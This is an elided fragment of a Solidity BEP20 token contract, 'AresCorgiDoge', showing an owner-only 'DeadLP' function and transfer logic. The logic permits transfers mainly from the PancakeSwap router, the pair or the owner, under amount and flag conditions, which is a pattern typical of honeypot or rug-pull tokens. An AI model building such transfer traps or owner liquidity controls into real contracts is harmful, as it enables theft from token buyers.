...
contract AresCorgiDoge is Context, iBEP20, Ownable {
...
function DeadLP(uint256 amount) external onlyOwner returns (bool) {
...
function _transfer(address sender, address recipient, uint256 amount) internal {
  ...
  if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
    ...
    if( (amount <= _LCK || isSL) && !isContract(sender) ) {
        allow = true;
    }
  }
  if(allow) {
